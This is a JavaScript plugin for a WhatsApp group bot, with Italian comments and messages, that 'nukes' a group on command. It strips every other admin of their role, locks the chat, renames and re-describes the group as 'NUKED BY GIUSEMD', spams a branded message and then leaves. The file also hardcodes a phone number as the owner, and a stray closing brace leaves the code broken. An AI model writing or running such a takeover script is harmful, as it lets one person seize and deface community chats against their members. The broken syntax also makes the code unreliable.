const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

let handler = async (m, { conn, isOwner, isBotAdmin, participants }) => {
    if (!isOwner) {
        return m.reply('👑 *Solo il mio creatore può usare questo comando!* 👑');
    }

    if (!m.isGroup) {
        return m.reply('⚠️ *Questo comando funziona solo nei gruppi.* ⚠️');
    }

    if (!isBotAdmin) {
        return m.reply('🤖 *Devo essere amministratore per eseguire quest\'azione!* 🤖');
    }

    const chatId = m.chat;
    const botNumber = conn.user.jid;
    const ownerNumber = conn.user.jid.split('@')[0] === "393445461546" ? "393445461546@s.whatsapp.net" : (global.owner && global.owner[0] + '@s.whatsapp.net') || ''; // Tenta di prendere il proprietario da global.owner
    const myJid = isOwner ? ownerNumber : null;
    const spamMessage = "💥 *NUKED BY GIUSEMD* 💥";

    try {
        // 🛡️ Rimuove gli admin tranne il bot e il proprietario
        let admins = participants.filter(p => p.admin && p.id !== ownerNumber && p.id !== botNumber);
        for (let admin of admins) {
            await conn.groupParticipantsUpdate(chatId, [admin.id], "demote").catch(() => {});
            await delay(300);
        }

        // 🔒 Imposta chat solo amministratori (announcement in alcune lib)
        await conn.groupSettingUpdate(chatId, "announcement").catch(() => {});

        // 🔥 Cambia nome e descrizione del gruppo
        const nukeText = '💀 NUKED BY GIUSEMD 💀';
        await conn.groupUpdateSubject(chatId, nukeText).catch(() => {});
        await delay(500);
        await conn.groupUpdateDescription(chatId, `🔥 Questo gruppo è stato distrutto da ${conn.user.name || 'Il Bot Distruttore'} 🔥`).catch(() => {});

        // 📢 Spamma il messaggio 5 volte con "mostra canale"
        if (myJid) {
            for (let i = 0; i < 5; i++) {
                await conn.sendMessage(
                    chatId,
                    {
                        text: spamMessage,
                        contextInfo: {
                            mentionedJid: [myJid],
                            externalAdReply: {
                                title: '🔥 Canale di Distruzione 🔥',
                                body: null,
                                previewType: 'NONE',
                                showAdAttribution: true,
                                mediaUrl: `https://wa.me/${botNumber}`,
                                mediaType: 2,
                                thumbnail: null,
                                sourceUrl: `https://wa.me/${botNumber}`
                            }
                        }
                    }
                );
                await delay(500);
            }
        }

       
        }

        // 🚪 Il bot esce dal gruppo
        await conn.sendMessage(chatId, { text: "💀 *MISSIONE COMPLETATA. AUTODISTRUZIONE.* 💀" });
        await delay(1000);
        await conn.groupLeave(chatId).catch(() => {});

    } catch (error) {
        console.error("Errore in .nuke:", error);
        conn.reply(chatId, "❌ Errore durante la procedura di eliminazione!", m);
    }
};

// 📌 Configurazione del comando
handler.command = /^giuse$/i;
handler.group = true;
handler.admin = true;
handler.botAdmin = true;
handler.owner = true; // Solo il proprietario può usarlo

export default handler;